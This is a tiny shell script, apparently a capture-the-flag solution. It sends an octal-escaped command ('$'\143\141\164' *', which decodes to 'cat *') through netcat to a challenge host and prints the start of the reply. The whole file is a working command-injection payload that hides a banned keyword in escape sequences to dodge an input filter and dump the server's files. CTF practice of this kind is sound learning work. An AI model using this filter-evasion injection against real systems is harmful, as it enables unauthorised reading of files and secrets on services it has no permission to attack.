#!/bin/sh
echo "$'\143\141\164' *" | nc challs.hackademint.org 40008 | head -n 3
